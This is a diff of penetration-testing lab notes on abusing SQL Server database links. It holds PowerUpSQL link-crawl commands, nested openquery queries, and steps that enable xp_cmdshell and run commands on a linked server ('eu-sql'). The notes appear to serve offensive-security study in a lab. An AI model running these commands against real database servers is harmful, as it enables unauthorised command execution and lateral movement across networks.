@@ -28,7 +28,6 @@ A database link allows a SQL Server to access external data sources like other S
 > **Note**: Database links work even across forest trusts. **Forest security boundaries can't even stop it**
 
 [^1]![[Pasted image 20250521200749.png]]
-
 ###### Search for Database Links
 ```powershell
 Get-SQLServerLink -Instance dcorp-mssql -Verbose
@@ -48,6 +47,8 @@ Jesus lol
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
 ```
 
+![[Pasted image 20250521201531.png]]
+
 Manual - The `Openquery()` function can be used to run queries on a linked database
 ```sql
 select * from openquery("dcorp-sql1",'select * from master..sysservers')
@@ -62,6 +63,11 @@ select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''sel
 ###### Executing Commands
 > **Important:** If `rpcout` is enabled (disabled by default), `xp_cmdshell` can be enabled >
 
+```powershell
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "execmaster..xp_cmdshell 'whoami'" -QueryTarget eu-sql
+```
+
+Manual
 ```sql
 EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
 ```
